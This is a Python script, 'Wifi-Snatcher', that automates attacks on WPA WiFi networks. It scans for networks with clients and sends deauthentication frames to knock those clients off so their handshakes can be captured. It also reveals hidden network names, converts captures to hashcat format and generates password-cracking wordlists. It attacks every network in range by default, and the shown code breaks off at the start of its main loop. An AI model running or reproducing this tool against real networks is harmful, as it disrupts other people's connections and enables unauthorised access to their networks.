#!/usr/bin/env python3
"""
Wifi-Snatcher - WiFi handshake capture & wordlist generator.
Puts interface in monitor mode, scans for networks with clients,
captures handshakes via deauth, verifies and stores them.
Requires: aircrack-ng suite, root.
"""

from __future__ import annotations

__version__ = "1.0"

BANNER = r"""
 __          ___  __ _        _____             _       _               
 \ \        / (_)/ _(_)      / ____|           | |     | |              
  \ \  /\  / / _| |_ _ _____| (___  _ __   __ _| |_ ___| |__   ___ _ __ 
   \ \/  \/ / | |  _| |______\___ \| '_ \ / _` | __/ __| '_ \ / _ \ '__|
    \  /\  /  | | | | |      ____) | | | | (_| | || (__| | | |  __/ |   
     \/  \/   |_|_| |_|     |_____/|_| |_|\__,_|\__\___|_| |_|\___|_|   
                                                                                                                                    
 Written by: x4v1l0k - v""" + __version__ + r"""
"""

import argparse
import csv
import hashlib
import itertools
import logging
import os
import re
import signal
import sqlite3
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from typing import Optional
import shutil
import threading

try:
    from colorama import init as colorama_init, Fore, Style, Back
    colorama_init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False
    _d = ""
    Fore = type("F", (), {"GREEN": _d, "RED": _d, "YELLOW": _d, "CYAN": _d, "MAGENTA": _d, "BLUE": _d, "WHITE": _d, "RESET": _d})()
    Style = type("S", (), {"BRIGHT": _d, "DIM": _d, "RESET_ALL": _d})()
    Back = type("B", (), {"BLACK": _d, "RESET": _d})()

R = Style.RESET_ALL if HAS_COLORAMA else ""

# MAC address pattern for highlighting
_MAC_RE = re.compile(r"\b([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\b")


def _colorize_message(msg: str) -> str:
    """Apply rich colors to message: MACs, paths, numbers, keywords."""
    if not HAS_COLORAMA:
        return msg
    # MAC addresses -> magenta
    msg = _MAC_RE.sub(f"{Fore.MAGENTA}{Style.BRIGHT}\\1{R}", msg)
    # Paths (absolute) -> blue
    msg = re.sub(r"(/[^\s\]\)]+)", f"{Fore.BLUE}\\1{R}", msg)
    # Integers (standalone or after space) -> cyan (avoid timestamp by skipping first asctime)
    msg = re.sub(r"(?<=[\]\s:=])(\d+)(?=[\s\]\),.]|$)", f"{Fore.CYAN}\\1{R}", msg)
    # Keywords -> yellow bright
    for kw in ("Cycle", "handshake", "Scanning", "Capturing", "Exiting", "Monitor", "Skip", "valid", "Hashcat"):
        msg = re.sub(rf"\b({re.escape(kw)})\b", f"{Fore.YELLOW}{Style.BRIGHT}\\1{R}", msg)
    # Success-like -> green
    for kw in ("already", "done", "Stored"):
        msg = re.sub(rf"\b({re.escape(kw)})\b", f"{Fore.GREEN}{Style.BRIGHT}\\1{R}", msg)
    return msg


# --- Logging formatter with colors ---
class ColoredFormatter(logging.Formatter):
    LEVEL_COLORS = {
        logging.DEBUG: Fore.CYAN + Style.DIM,
        logging.INFO: Fore.GREEN,
        logging.WARNING: Fore.YELLOW + Style.BRIGHT,
        logging.ERROR: Fore.RED + Style.BRIGHT,
        logging.CRITICAL: Fore.RED + Style.BRIGHT + Back.BLACK,
    }

    def __init__(self, fmt: str, use_color: bool = True, datefmt: Optional[str] = None):
        super().__init__(fmt, datefmt=datefmt)
        self.use_color = use_color and HAS_COLORAMA

    def format(self, record: logging.LogRecord) -> str:
        s = super().format(record)
        if self.use_color:
            color = self.LEVEL_COLORS.get(record.levelno, "")
            s = s.replace(record.levelname, f"{color}{record.levelname}{R}", 1)
            # Colorize the message part (after the second '] ')
            if "] " in s:
                pre, _, rest = s.partition("] ")
                s = pre + "] " + _colorize_message(rest)
        return s


def setup_logging(log_path: Optional[str] = None) -> None:
    """Configure root logger with optional file and colored console."""
    fmt = "%(asctime)s [%(levelname)s] %(message)s"
    date_fmt = "%Y-%m-%d %H:%M:%S"
    root = logging.getLogger()
    root.setLevel(logging.DEBUG)
    root.handlers.clear()

    console = logging.StreamHandler(sys.stdout)
    console.setLevel(logging.INFO)
    console.setFormatter(ColoredFormatter(fmt, datefmt=date_fmt, use_color=HAS_COLORAMA))
    root.addHandler(console)

    if log_path:
        Path(log_path).parent.mkdir(parents=True, exist_ok=True)
        fh = logging.FileHandler(log_path, encoding="utf-8")
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(logging.Formatter(fmt, datefmt=date_fmt))
        root.addHandler(fh)


def run_cmd(cmd: list[str], timeout: Optional[int] = None, capture: bool = True) -> tuple[int, str, str]:
    """Run command; return (returncode, stdout, stderr)."""
    try:
        r = subprocess.run(
            cmd,
            shell=False,
            capture_output=capture,
            text=True,
            timeout=timeout,
        )
        return (r.returncode, (r.stdout or ""), (r.stderr or ""))
    except subprocess.TimeoutExpired:
        return (-1, "", "Timeout")
    except FileNotFoundError:
        return (-1, "", "Command not found")


def set_managed_mode(mon_iface: str) -> bool:
    """Put the interface back in managed mode (e.g. after Ctrl+C). Returns True on success."""
    if not mon_iface:
        return False
    logging.info("Putting interface %s back to managed mode...", mon_iface)
    code, out, err = run_cmd(["airmon-ng", "stop", mon_iface], timeout=15)
    if code == 0:
        logging.info("Interface set to managed mode.")
        return True
    logging.warning("airmon-ng stop failed: %s %s", out or "", err or "")
    return False


def ensure_monitor_mode(device: str) -> Optional[str]:
    """
    Put interface in monitor mode if needed.
    Returns monitor interface name by parsing airmon-ng output (driver-specific),
    with fallback to dev + "mon".
    """
    dev = device.strip()
    # Check if already monitor
    code, out, err = run_cmd(["iwconfig", dev], timeout=5)
    if code == 0 and "Mode:Monitor" in out:
        logging.info("Interface %s is already in monitor mode", dev)
        return dev
    # Start monitor with airmon-ng
    logging.info("Putting interface %s into monitor mode...", dev)
    code, out, err = run_cmd(["airmon-ng", "start", dev], timeout=15)
    if code != 0:
        logging.error("airmon-ng start failed: %s %s", out, err)
        return None
    combined = (out or "") + " " + (err or "")
    # Parse airmon-ng output for the created monitor interface (driver-specific)
    # e.g. "(monitor mode enabled on mon0)" or "(mac80211 ... on [phy0]wlan0mon)"
    mon = None
    for pattern in (
        r"monitor\s+mode\s+enabled\s+on\s+(\w+)",
        r"on\s+\[phy\d+\]\s*(\w+)",
    ):
        m = re.search(pattern, combined, re.IGNORECASE)
        if m:
            candidate = m.group(1).strip()
            if candidate and candidate != dev:
                code2, iw_out, _ = run_cmd(["iwconfig", candidate], timeout=5)
                if code2 == 0 and "Mode:Monitor" in (iw_out or ""):
                    mon = candidate
                    break
    if mon is None:
        mon = dev + "mon" if not dev.endswith("mon") else dev
        if "mon" not in mon:
            mon = dev + "mon"
        code2, _, _ = run_cmd(["iwconfig", mon], timeout=5)
        if code2 != 0:
            logging.info("Using interface %s as monitor (parsed name not found)", dev)
            return dev
    logging.info("Monitor interface: %s", mon)
    return mon


def parse_airodump_csv(csv_path: Path) -> tuple[list[dict], list[dict]]:
    """
    Parse airodump-ng CSV. Returns (list of APs, list of stations).
    AP: BSSID, channel, ESSID, ...
    Station: Station MAC, BSSID, ...
    """
    aps: list[dict] = []
    stations: list[dict] = []
    if not csv_path.exists():
        return aps, stations

    with open(csv_path, newline="", encoding="utf-8", errors="replace") as f:
        reader = csv.reader(f)
        section: Optional[str] = None
        headers_ap: list[str] = []
        headers_st: list[str] = []

        for row in reader:
            if not row:
                continue
            first = (row[0] or "").strip()
            if "BSSID" in first and "Station" not in first:
                section = "ap"
                headers_ap = [h.strip() for h in row]
                continue
            if "Station MAC" in first or (section == "ap" and first == "BSSID"):
                if "Station" in first or "BSSID" in first:
                    section = "station"
                    headers_st = [h.strip() for h in row]
                continue

            if section == "ap" and headers_ap:
                if first and len(row) >= len(headers_ap) and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", first):
                    ap = dict(zip(headers_ap, row[: len(headers_ap)]))
                    bssid = ap.get("BSSID", "").strip()
                    if bssid and bssid != "(not associated)":
                        try:
                            ch = ap.get("channel", "").strip() or "0"
                            ap["channel"] = int(ch) if ch.isdigit() else 0
                        except (ValueError, TypeError):
                            ap["channel"] = 0
                        essid_val = (ap.get("ESSID") or "").strip()
                        if not essid_val:
                            essid_val = "hidden_network"
                        ap["ESSID"] = essid_val
                        aps.append(ap)
            elif section == "station" and headers_st:
                if first and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", first):
                    st = dict(zip(headers_st, row[: len(headers_st)]))
                    st_bssid = (st.get("BSSID") or "").strip()
                    if st_bssid and st_bssid != "(not associated)":
                        stations.append(st)

    return aps, stations


def get_networks_with_clients(
    mon_iface: str,
    scan_secs: int,
    scan_dir: Path,
    skip_bssids: set[str],
    skip_essids: Optional[set[str]] = None,
    current_proc_holder: Optional[list] = None,
    channel: Optional[int] = None,
) -> list[dict]:
    """
    Run airodump for scan_secs, parse CSV, return list of APs that have at least
    one client, excluding skip_bssids and skip_essids. Each item: {bssid, channel, essid, clients: [mac, ...]}.
    Scan CSVs are written to scan_dir (temporary directory).
    """
    skip_essids = skip_essids or set()
    scan_dir.mkdir(parents=True, exist_ok=True)
    prefix = scan_dir / "scan"
    csv_base = str(prefix)
    cmd = [
        "airodump-ng",
        "--output-format",
        "csv",
        "--write",
        csv_base,
    ]
    if channel is not None:
        cmd.extend(["--channel", str(channel)])
    else:
        # 2.4GHz (b/g) + 5GHz (a)
        cmd.extend(["--band", "abg"])
    cmd.extend(
        [
            "-a",  # only associated
            mon_iface,
        ]
    )
    logging.info("Scanning for %d seconds...", scan_secs)
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        cwd=str(scan_dir),
    )
    if current_proc_holder is not None:
        current_proc_holder[0] = proc
    try:
        time.sleep(scan_secs)
        proc.terminate()
        try:
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
    finally:
        if current_proc_holder is not None:
            current_proc_holder[0] = None

    # Find latest CSV (airodump writes scan-01.csv, etc.)
    csv_files = list(scan_dir.glob("scan-*.csv"))
    if not csv_files:
        logging.warning("No scan CSV found")
        return []

    csv_path = max(csv_files, key=lambda p: p.stat().st_mtime)
    aps, stations = parse_airodump_csv(csv_path)
    bssid_to_clients: dict[str, list[str]] = {}
    for st in stations:
        b = (st.get("BSSID") or "").strip()
        mac = (st.get("Station MAC") or "").strip()
        if b and mac:
            bssid_to_clients.setdefault(b, []).append(mac)

    result: list[dict] = []
    for ap in aps:
        bssid = (ap.get("BSSID") or "").strip()
        essid = (ap.get("ESSID") or "").strip()
        if not bssid or bssid.lower() in skip_bssids:
            continue
        if essid in skip_essids:
            continue
        clients = bssid_to_clients.get(bssid, [])
        if not clients:
            continue
        result.append({
            "bssid": bssid,
            "channel": ap.get("channel", 0) or 0,
            "essid": essid,
            "clients": list(dict.fromkeys(clients)),
        })

    logging.info("Found %d networks with clients (after skipping %d done)", len(result), len(skip_bssids))
    return result


def reveal_hidden_essid(
    mon_iface: str,
    bssid: str,
    channel: int,
    client_macs: list[str],
    scan_dir: Path,
    current_proc_holder: Optional[list] = None,
    timeout_sec: int = 25,
) -> Optional[str]:
    """
    Try to reveal the ESSID of a hidden network by running airodump focused on the BSSID,
    sending deauths so clients reconnect (Association Request contains SSID), then parsing
    the CSV. Returns the revealed ESSID or None. Only trusts the ESSID from the AP row
    for this BSSID to avoid false positives.
    """
    scan_dir.mkdir(parents=True, exist_ok=True)
    prefix = scan_dir / f"reveal_{bssid.replace(':', '')}"
    csv_base = str(prefix)
    cmd = [
        "airodump-ng",
        "--bssid", bssid,
        "--channel", str(channel),
        "--write", csv_base,
        "-a",
        mon_iface,
    ]
    logging.info("Attempting ESSID recovery for hidden BSSID %s (timeout %ds)", bssid, timeout_sec)
    start = time.time()
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        cwd=str(scan_dir),
    )
    if current_proc_holder is not None:
        current_proc_holder[0] = proc
    try:
        time.sleep(5)
        for _ in range(2):
            if (time.time() - start) >= timeout_sec:
                break
            for client in client_macs[:2]:
                run_cmd([
                    "aireplay-ng",
                    "-0", "2",
                    "-a", bssid,
                    "-c", client,
                    "--ignore-negative-one",
                    mon_iface,
                ], timeout=10)
            time.sleep(5)
        remaining = max(2, timeout_sec - int(time.time() - start))
        time.sleep(min(5, remaining))
    finally:
        if current_proc_holder is not None:
            current_proc_holder[0] = None
        proc.terminate()
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

    csv_files = list(scan_dir.glob(f"reveal_{bssid.replace(':', '')}-*.csv"))
    if not csv_files:
        return None
    csv_path = max(csv_files, key=lambda p: p.stat().st_mtime)
    aps, _ = parse_airodump_csv(csv_path)
    bssid_lower = bssid.lower()
    for ap in aps:
        if (ap.get("BSSID") or "").strip().lower() == bssid_lower:
            essid = (ap.get("ESSID") or "").strip()
            if essid and essid != "hidden_network" and len(essid) <= 32:
                return essid
            break
    return None


def verify_handshake_cap(cap_path: Path) -> bool:
    """Verify that cap file contains at least one WPA handshake using aircrack-ng."""
    if not cap_path.exists():
        return False
    code, out, err = run_cmd(["aircrack-ng", str(cap_path), "-w", "/dev/null"], timeout=30)
    combined = (out + " " + err).lower()
    return "handshake" in combined and "0 handshake" not in combined


def convert_cap_to_hashcat(cap_path: Path) -> Optional[Path]:
    """
    Convert .cap to hashcat WPA-PBKDF2 (22000) format using hcxpcapngtool if available.
    Returns path to .22000 file or None. Removes partial .22000 if conversion fails.
    """
    out_path = cap_path.with_suffix(cap_path.suffix + ".22000")
    code, out, err = run_cmd(
        ["hcxpcapngtool", "-o", str(out_path), str(cap_path)],
        timeout=60,
    )
    if code == 0 and out_path.exists() and out_path.stat().st_size > 0:
        return out_path
    if out_path.exists():
        try:
            out_path.unlink()
        except OSError:
            pass
    return None


def capture_handshake(
    mon_iface: str,
    bssid: str,
    channel: int,
    client_macs: list[str],
    cap_path: Path,
    max_deauth: int = 5,
    current_proc_holder: Optional[list] = None,
    essid: str = "",
    ap_timeout: Optional[int] = None,
) -> bool:
    """
    Run airodump on channel targeting BSSID, send deauth to clients up to max_deauth times,
    then verify handshake in cap. Returns True if handshake found.
    """
    cap_path = Path(cap_path)
    cap_path.parent.mkdir(parents=True, exist_ok=True)
    cap_base = str(cap_path.with_suffix(""))
    cmd_capture = [
        "airodump-ng",
        "--bssid", bssid,
        "--channel", str(channel),
        "--write", cap_base,
        "-a",
        mon_iface,
    ]
    essid_display = essid if essid else "?"
    logging.info("Capturing on BSSID %s (%s) channel %s", bssid, essid_display, channel)
    start_time = time.time()
    proc = subprocess.Popen(
        cmd_capture,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        cwd=str(cap_path.parent),
    )
    if current_proc_holder is not None:
        current_proc_holder[0] = proc
    try:
        time.sleep(3)
        for attempt in range(max_deauth):
            if ap_timeout is not None and (time.time() - start_time) >= ap_timeout:
                logging.info(
                    "AP timeout reached while capturing %s (%s); stopping capture.",
                    bssid,
                    essid_display,
                )
                break
            for client in client_macs[:3]:  # limit clients per deauth round
                run_cmd([
                    "aireplay-ng",
                    "-0", "2",
                    "-a", bssid,
                    "-c", client,
                    "--ignore-negative-one",
                    mon_iface,
                ], timeout=10)
            time.sleep(4)
            if ap_timeout is not None and (time.time() - start_time) >= ap_timeout:
                logging.info(
                    "AP timeout reached after deauth round for %s (%s); stopping capture.",
                    bssid,
                    essid_display,
                )
                break
            if verify_handshake_cap(Path(cap_base + "-01.cap")):
                break
    finally:
        if current_proc_holder is not None:
            current_proc_holder[0] = None
        proc.terminate()
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

    cap_file = Path(cap_base + "-01.cap")
    if cap_file.exists() and verify_handshake_cap(cap_file):
        return True
    # Leave cleanup of failed .cap and side files to the main loop (glob cap_name + "*")
    return False


# Leet substitutions (common)
_LEET_MAP = {"a": "4", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7", "b": "8", "g": "9", "z": "2", "l": "1"}

# Max length to generate full 2^n case permutations (avoid explosion)
_MAX_FULL_CASE_LEN = 12
# Max leetable positions to generate full 2^k leet variants
_MAX_LEET_POSITIONS = 14


def _all_case_permutations(word: str) -> set[str]:
    """All 2^n case variants (upper/lower per character). Capped for long words."""
    low = word.lower()
    n = len(low)
    if n > _MAX_FULL_CASE_LEN:
        return {word, low, word.upper(), word.title()}
    out: set[str] = set()
    for bits in itertools.product((0, 1), repeat=n):
        s = "".join(low[i].upper() if bits[i] else low[i] for i in range(n))
        out.add(s)
    return out


def _all_leet_variants(word: str) -> set[str]:
    """All 2^k leet variants (substitute or not for each leetable char). Preserves case of non-substituted."""
    low = word.lower()
    # Positions that have a leet substitution
    positions = [i for i in range(len(low)) if low[i] in _LEET_MAP]
    if len(positions) > _MAX_LEET_POSITIONS:
        return {word, "".join(_LEET_MAP.get(c, c) for c in low)}
    out: set[str] = set()
    for choices in itertools.product((0, 1), repeat=len(positions)):
        s = list(word)
        for j, pos in enumerate(positions):
            if choices[j]:
                s[pos] = _LEET_MAP[low[pos]]
        out.add("".join(s))
    return out


def _case_then_leet_bases(word: str) -> set[str]:
    """All combinations: every case permutation, then every leet variant of that. E.g. Sarabi -> SaR4b1, s4r4b1, etc."""
    case_set = _all_case_permutations(word)
    bases: set[str] = set()
    for c in case_set:
        bases |= _all_leet_variants(c)
    return bases


def generate_wordlist_for_essid(essid: str, output_path: Path) -> int:
    """
    Generate a wordlist for the given ESSID: case/leet permutations + prefixes/suffixes (years, months, etc.).
    Returns number of lines written. No attacks; file-only.
    """
    if not essid or not essid.strip():
        return 0
    base = essid.strip()
    # All case x leet combinations (e.g. Sarabi -> S4rabi, saR4b1, s4r4b1, ...)
    bases = _case_then_leet_bases(base)
    words: set[str] = set(bases)
    current_year = time.localtime().tm_year
    year_suffixes = []
    for i in range(6):  # current year + 5 back
        y = current_year - i
        year_suffixes.append(str(y))
        year_suffixes.append(str(y)[2:])
    years_full = [str(y) for y in range(1990, 2031)]
    years_short = [str(y)[2:] for y in range(1990, 2031)]
    months = [f"{m:02d}" for m in range(1, 13)]
    suffixes = ["!", "!!", "@", "#", "123", "1234", "*", "?"]
    separators = [".", "-", "_", "*"]
    for w in bases:
        for suf in suffixes:
            words.add(w + suf)
            words.add(suf + w)
            for sep in separators:
                words.add(w + sep + suf)
                words.add(suf + sep + w)
        for y in year_suffixes:
            words.add(w + y)
            words.add(y + w)
            for sep in separators:
                words.add(w + sep + y)
                words.add(y + sep + w)
        for y in years_full:
            words.add(w + y)
            words.add(y + w)
        for y in years_short:
            words.add(w + y)
            words.add(y + w)
        for m in months:
            words.add(w + m)
            words.add(m + w)
            for sep in separators:
                words.add(w + sep + m)
                words.add(m + sep + w)
        words.add(w + "!")
        words.add(w + "123")
        words.add(w + "@")
        for sep in separators:
            words.add(w + sep + "123")
            words.add(w + sep + "!")
    # Dedupe and sort
    lines = sorted(words)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w", encoding="utf-8", errors="replace") as f:
        for line in lines:
            f.write(line + "\n")
    return len(lines)


def init_db(db_path: Path) -> sqlite3.Connection:
    """Create or open SQLite DB and ensure table exists."""
    db_path.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(db_path))
    conn.execute("""
        CREATE TABLE IF NOT EXISTS captured (
            bssid TEXT PRIMARY KEY,
            essid TEXT,
            handshake_path TEXT,
            created_at TEXT
        )
    """)
    conn.execute(
        "CREATE INDEX IF NOT EXISTS idx_captured_essid ON captured(essid)"
    )
    conn.execute("""
        CREATE TABLE IF NOT EXISTS discovered_essids (
            bssid TEXT PRIMARY KEY,
            essid TEXT NOT NULL,
            discovered_at TEXT
        )
    """)
    conn.commit()
    return conn


def check_dependencies() -> bool:
    """
    Check for required external tools. Returns True if everything critical is
    present, otherwise logs installation hints and returns False.
    """
    required = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
    optional = ["hcxpcapngtool", "iwconfig"]

    missing_required = [cmd for cmd in required if shutil.which(cmd) is None]
    missing_optional = [cmd for cmd in optional if shutil.which(cmd) is None]

    if missing_required:
        logging.error(
            "Missing required external tools: %s",
            ", ".join(missing_required),
        )
        logging.error(
            "Install them before continuing. On Debian/Kali-like systems you can run, for example: "
            "sudo apt update && sudo apt install aircrack-ng"
        )
        return False

    if missing_optional:
        logging.warning(
            "Optional tools not found: %s (some features may be limited)",
            ", ".join(missing_optional),
        )
        logging.warning(
            "It is recommended to install 'hcxtools' to get hcxpcapngtool "
            "and generate 22000 hashes for hashcat."
        )

    logging.debug("All critical external dependencies are available.")
    return True


def verify_stored_handshakes(conn: sqlite3.Connection, handshakes_dir: Path) -> None:
    """
    Re-verify all stored handshakes with hcxpcapngtool; remove from DB and disk if invalid.
    Call this on script exit to drop false positives.
    """
    to_remove: list[tuple[str, str]] = []
    for row in conn.execute("SELECT bssid, essid, handshake_path FROM captured"):
        bssid, essid, handshake_path = (row[0] or "").strip(), (row[1] or "").strip(), (row[2] or "").strip()
        if not handshake_path:
            to_remove.append((bssid, essid))
            continue
        cap_path = Path(handshake_path)
        if not cap_path.is_absolute():
            cap_path = handshakes_dir / cap_path.name
        if not cap_path.exists():
            logging.warning("Stored handshake file missing, removing from DB: %s", cap_path)
            to_remove.append((bssid, essid))
            continue
        hc_path = convert_cap_to_hashcat(cap_path)
        if hc_path is None or not hc_path.exists() or hc_path.stat().st_size == 0:
            logging.info("Removing invalid handshake (failed re-check): %s (%s)", bssid, essid or "?")
            to_remove.append((bssid, essid))
            try:
                cap_path.unlink()
            except OSError:
                pass
            hc_file = cap_path.with_suffix(cap_path.suffix + ".22000")
            if hc_file.exists():
                try:
                    hc_file.unlink()
                except OSError:
                    pass
            continue
        # Ensure .22000 is next to .cap with expected name (already done at store time; no-op usually)
        expected_22000 = cap_path.with_suffix(cap_path.suffix + ".22000")
        if hc_path != expected_22000 and expected_22000.exists():
            try:
                hc_path.unlink()
            except OSError:
                pass
    for bssid, essid in to_remove:
        conn.execute("DELETE FROM captured WHERE bssid = ?", (bssid,))
    if to_remove:
        conn.commit()
        logging.info("Final check: removed %d invalid handshake(s) from DB and disk.", len(to_remove))


class _HelpFormatter(argparse.ArgumentDefaultsHelpFormatter):
    def _get_help_string(self, action: argparse.Action) -> str:
        help_str = super()._get_help_string(action)
        if action.default is None and "%(default)" not in (action.help or ""):
            if action.dest == "path":
                return (action.help or "") + " (default: Actual path)"
            if action.dest == "log":
                return (action.help or "") + " (default: disabled)"
        return help_str


def _print_banner() -> None:
    """Print ASCII banner to stdout (with color if available)."""
    try:
        if HAS_COLORAMA:
            print(f"{Fore.CYAN}{Style.BRIGHT}{BANNER}{R}")
        else:
            print(BANNER)
    except Exception:
        print(BANNER)


def main() -> int:
    _print_banner()
    parser = argparse.ArgumentParser(
        description="Wifi-Snatcher - WiFi handshake capture & wordlist generator.",
        formatter_class=_HelpFormatter,
    )
    parser.add_argument("-d", "--device", default=None, help="Wireless interface (e.g. wlan0); not required with -w")
    parser.add_argument("-t", "--time", type=int, default=30, help="Scan duration in seconds")
    parser.add_argument("-l", "--log", default=None, help="Path to log file")
    parser.add_argument("-p", "--path", default=None, help="Directory for scan files, handshakes and DB")
    parser.add_argument("-se", "--skip-essid", action="append", default=[], dest="skip_essids", metavar="ESSID",
                        help="ESSID to exclude from attacks (repeatable)")
    parser.add_argument("-sb", "--skip-bssid", action="append", default=[], dest="skip_bssids_arg", metavar="BSSID",
                        help="BSSID (MAC) to exclude from attacks (repeatable)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show verbose messages (e.g. why a handshake was not marked as captured)")
    parser.add_argument("-w", "--wordlist", nargs="?", const="", default=None, metavar="DIR",
                        help="Generate wordlists for captured ESSIDs only (no attacks); DIR = output dir (default: <path>/wordlists)")
    parser.add_argument("-b", "--bssid", action="append", default=[], dest="target_bssids", metavar="BSSID",
                        help="Single target mode by BSSID (repeatable). If used, only these BSSIDs will be attacked.")
    parser.add_argument("-e", "--essid", action="append", default=[], dest="target_essids", metavar="ESSID",
                        help="Single target mode by ESSID (repeatable). If used, all APs with that name will be attacked.")
    parser.add_argument("-c", "--channel", type=int, default=None,
                        help="Fixed channel for scanning and capture (optional).")
    parser.add_argument("--stats", nargs="?", const=30, type=int, metavar="SECONDS",
                        help="Show periodic statistics: default every 30s, or every SECONDS if provided.")
    parser.add_argument("--ap-timeout", type=int, default=None, metavar="SECONDS",
                        help="Maximum capture time per AP (including deauth rounds).")
    parser.add_argument("--ap-delay", type=int, default=2, metavar="SECONDS",
                        help="Delay between APs to avoid driver issues.")
    parser.add_argument("--hidden-wait", type=int, default=25, metavar="SECONDS",
                        help="Max time (seconds) to spend trying to reveal a hidden ESSID before capture.")
    args = parser.parse_args()

    base_path = (Path(args.path) if args.path else Path.cwd()).resolve()
    base_path.mkdir(parents=True, exist_ok=True)
    db_path = base_path / "captured.db"
    handshakes_dir = base_path / "handshakes"
    scan_temp_dir: Optional[Path] = None

    setup_logging(args.log)

    # Wordlist-only mode: no device, no attacks; generate one wordlist per captured ESSID
    if args.wordlist is not None:
        out_dir = (base_path / "wordlists").resolve() if args.wordlist == "" else Path(args.wordlist).resolve()
        out_dir.mkdir(parents=True, exist_ok=True)
        conn = init_db(db_path)
        seen: set[str] = set()
        total_words = 0
        for row in conn.execute("SELECT essid FROM captured"):
            essid = (row[0] or "").strip()
            if not essid or essid in seen:
                continue
            seen.add(essid)
            safe_name = re.sub(r"[^\w\-.]", "_", essid)[:50]
            out_file = out_dir / f"{safe_name}.txt"
            n = generate_wordlist_for_essid(essid, out_file)
            total_words += n
            logging.info("Generated wordlist for %s: %s (%d words)", essid, out_file, n)
        conn.close()
        if not seen:
            logging.warning("No captured ESSIDs in DB; no wordlists generated.")
        else:
            logging.info("Wordlist mode done: %d ESSID(s), %d total words in %s", len(seen), total_words, out_dir)
        return 0

    # From here on, we are in online capture mode and must be root with dependencies available.
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        logging.error("This script must be run as root. Use sudo or run it as the root user.")
        return 1

    if not check_dependencies():
        return 1

    if not args.device:
        logging.error("Device (-d) is required when not using -w/--wordlist.")
        return 1

    scan_temp_dir = Path(tempfile.mkdtemp(prefix="wifi_handshake_scan_"))

    logging.info("Data path: %s | Handshakes: %s | DB: %s", base_path, handshakes_dir, db_path)

    mon_iface = ensure_monitor_mode(args.device)
    if not mon_iface:
        logging.error("Could not set monitor mode. Run as root and pass a valid interface.")
        if scan_temp_dir is not None:
            shutil.rmtree(scan_temp_dir, ignore_errors=True)
        return 1

    conn = init_db(db_path)
    skip_bssids: set[str] = set()
    try:
        for row in conn.execute("SELECT bssid FROM captured"):
            skip_bssids.add((row[0] or "").strip().lower())
    except Exception:
        pass
    for b in args.skip_bssids_arg or []:
        skip_bssids.add(b.strip().lower())
    skip_essids: set[str] = set((e.strip() for e in (args.skip_essids or [])))
    if skip_essids:
        logging.info("Skipping ESSIDs: %s", ", ".join(skip_essids))
    if args.skip_bssids_arg:
        logging.info("Skipping %d user BSSIDs", len(args.skip_bssids_arg))
    logging.info("Already captured %d networks (will skip)", len(skip_bssids))

    target_bssids = set((b.strip().lower() for b in (args.target_bssids or [])))
    target_essids = set((e.strip() for e in (args.target_essids or [])))
    if target_bssids:
        logging.info("Single target mode by BSSID: %s", ", ".join(sorted(target_bssids)))
    if target_essids:
        logging.info("Single target mode by ESSID: %s", ", ".join(sorted(target_essids)))
    if args.channel is not None:
        logging.info("Using fixed channel: %s", args.channel)

    discovered_essids: dict[str, str] = {}
    try:
        for row in conn.execute("SELECT bssid, essid FROM discovered_essids"):
            b = (row[0] or "").strip().lower()
            e = (row[1] or "").strip()
            if b and e:
                discovered_essids[b] = e
    except Exception:
        pass
    if discovered_essids:
        logging.info("Loaded %d cached revealed ESSID(s) for hidden networks", len(discovered_essids))

    # Per-run failure count; skip network for rest of run after 4 failures
    fail_count: dict[str, int] = {}
    MAX_FAILURES_BEFORE_SKIP = 4

    def reload_skip_list() -> None:
        nonlocal skip_bssids
        skip_bssids = set((b.strip().lower() for b in (args.skip_bssids_arg or [])))
        for row in conn.execute("SELECT bssid FROM captured"):
            skip_bssids.add((row[0] or "").strip().lower())

    # Holder for current airodump (or other) subprocess; signal handler kills it and exits
    current_proc_holder: list = [None]

    def sig_handler(_sig: int, _frame: object) -> None:
        logging.info("Interrupt received; stopping all...")
        proc = current_proc_holder[0]
        if proc is not None:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=1)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
            current_proc_holder[0] = None
        # Do not set_managed_mode nor close conn here; finally block will run and do both once
        sys.exit(0)

    signal.signal(signal.SIGINT, sig_handler)
    signal.signal(signal.SIGTERM, sig_handler)

    cycle = 0
    start_time = time.time()
    stats = {
        "cycles": 0,
        "candidate_networks": 0,
        "attempted": 0,
        "success": 0,
        "failed": 0,
        "skipped": 0,
        "hidden_detected": 0,
        "hidden_resolved": 0,
    }

    def format_stats() -> str:
        elapsed = int(time.time() - start_time)
        return (
            f"Cycles: {stats['cycles']} | Candidate networks: {stats['candidate_networks']} | "
            f"Attempts: {stats['attempted']} | Success: {stats['success']} | Failed: {stats['failed']} | "
            f"Skipped: {stats['skipped']} | Hidden: {stats['hidden_detected']} detected, {stats['hidden_resolved']} resolved | "
            f"Total time: {elapsed}s"
        )

    stats_thread: Optional[threading.Thread] = None
    stats_stop = threading.Event()

    if args.stats is not None and args.stats > 0:
        interval = max(5, args.stats)

        def _stats_worker() -> None:
            while not stats_stop.wait(interval):
                logging.info("[Stats] %s", format_stats())

        stats_thread = threading.Thread(target=_stats_worker, name="stats-reporter", daemon=True)
        stats_thread.start()
    try:
        while True:
            cycle += 1
